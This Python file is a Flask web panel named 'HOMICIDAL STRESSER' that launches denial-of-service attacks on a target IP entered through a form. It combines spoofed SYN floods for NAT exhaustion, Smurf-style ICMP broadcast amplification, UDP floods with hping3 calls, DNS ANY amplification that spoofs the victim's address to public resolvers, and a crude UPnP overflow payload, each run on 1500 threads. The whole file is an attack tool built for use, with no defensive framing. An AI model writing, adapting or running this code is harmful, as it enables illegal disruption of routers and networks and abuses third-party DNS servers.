#!/usr/bin/env python3
from flask import Flask, request, render_template
from scapy.all import *
import threading
import random
import socket
import time
import os

app = Flask(__name__)

# Global attack state
ATTACK_RUNNING = False
TARGET_IP = None
THREAD_COUNT = 1500  # Increased for router-crashing intensity
ATTACK_DURATION = 60
ATTACK_TYPE = "all"
OPEN_DNS_RESOLVERS = ["8.8.8.8", "1.1.1.1"]  # Add more for amplification

# UPnP Buffer Overflow (Targeting vulnerable routers)
def upnp_exploit(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Simplified UPnP exploit payload (CVE-2019-17621 style)
    payload = b"M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:upnp:rootdevice\r\nMX:2\r\nMAN:\"ssdp:discover\"\r\n" + b"A" * 2048
    end_time = time.time() + ATTACK_DURATION
    while time.time() < end_time and ATTACK_RUNNING:
        try:
            sock.sendto(payload, (target_ip, 1900))  # UPnP port
        except:
            break
    sock.close()

# NAT Table Exhaustion (Spoofed TCP SYN)
def nat_exhaust(target_ip):
    fake_ips = [f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" for _ in range(50)]
    ip = IP(src=random.choice(fake_ips), dst=target_ip)
    tcp = TCP(sport=random.randint(1024, 65535), dport=[80, 443, 23, 53, 8080], flags="S")
    packet = ip / tcp
    end_time = time.time() + ATTACK_DURATION
    while time.time() < end_time and ATTACK_RUNNING:
        send(packet, verbose=0)

# ICMP Amplification (Smurf-style)
def icmp_amplification(target_ip):
    ip = IP(src=target_ip, dst="255.255.255.255")  # Broadcast amplification
    icmp = ICMP(type=8)  # Echo request
    packet = ip / icmp / (b"X" * 1024)  # Large payload
    end_time = time.time() + ATTACK_DURATION
    while time.time() < end_time and ATTACK_RUNNING:
        send(packet, verbose=0)

# UDP Flood with Router Crash Payload
def udp_flood(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Router-specific crash payload (e.g., Netgear R7000 overflow)
    payload = b"\x00\x01\x02\x03" + random._urandom(4096)  # 4KB chaos
    end_time = time.time() + ATTACK_DURATION
    while time.time() < end_time and ATTACK_RUNNING:
        try:
            sock.sendto(payload, (target_ip, random.randint(1, 65535)))
            os.system(f"hping3 -S {target_ip} -c 1000 &")  # Additional flood
        except:
            break
    sock.close()

# DNS Amplification for Resource Overload
def dns_amplification(target_ip):
    ip = IP(src=target_ip, dst=random.choice(OPEN_DNS_RESOLVERS))
    udp = UDP(sport=random.randint(1024, 65535), dport=53)
    dns = DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
    packet = ip / udp / dns
    end_time = time.time() + ATTACK_DURATION
    while time.time() < end_time and ATTACK_RUNNING:
        send(packet, verbose=0)

# Launch Attack
def launch_attack(target_ip, attack_type, duration):
    global ATTACK_RUNNING, ATTACK_DURATION
    ATTACK_RUNNING = True
    ATTACK_DURATION = duration
    print(f"[HOMICIDAL STRESSER] Initiating router execution on {target_ip} with {attack_type}")
    attack_funcs = {
        "upnp": upnp_exploit,
        "nat": nat_exhaust,
        "icmp": icmp_amplification,
        "udp": udp_flood,
        "dns": dns_amplification,
        "all": [upnp_exploit, nat_exhaust, icmp_amplification, udp_flood, dns_amplification]
    }
    funcs = attack_funcs.get(attack_type, attack_funcs["all"])
    if not isinstance(funcs, list):
        funcs = [funcs]
    for func in funcs:
        for _ in range(THREAD_COUNT):
            threading.Thread(target=func, args=(target_ip,)).start()
    time.sleep(duration)
    ATTACK_RUNNING = False
    print(f"[HOMICIDAL STRESSER] Router {target_ip} terminated")

# Web Routes
@app.route("/", methods=["GET", "POST"])
def index():
    global TARGET_IP, ATTACK_TYPE, ATTACK_DURATION
    if request.method == "POST":
        TARGET_IP = request.form.get("target_ip")
        ATTACK_TYPE = request.form.get("attack_type", "all")
        ATTACK_DURATION = int(request.form.get("duration", 60))
        if TARGET_IP and not ATTACK_RUNNING:
            threading.Thread(target=launch_attack, args=(TARGET_IP, ATTACK_TYPE, ATTACK_DURATION)).start()
            return render_template("index.html", message=f"Router crash initiated on {TARGET_IP} ({ATTACK_TYPE})")
        elif ATTACK_RUNNING:
            return render_template("index.html", message="Attack already in progress")
        else:
            return render_template("index.html", message="Invalid IP")
    status = "Running" if ATTACK_RUNNING else "Idle"
    return render_template("index.html", message=f"Status: {status}")

@app.route("/stop")
def stop():
    global ATTACK_RUNNING
    ATTACK_RUNNING = False
    return render_template("index.html", message="Attack halted")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
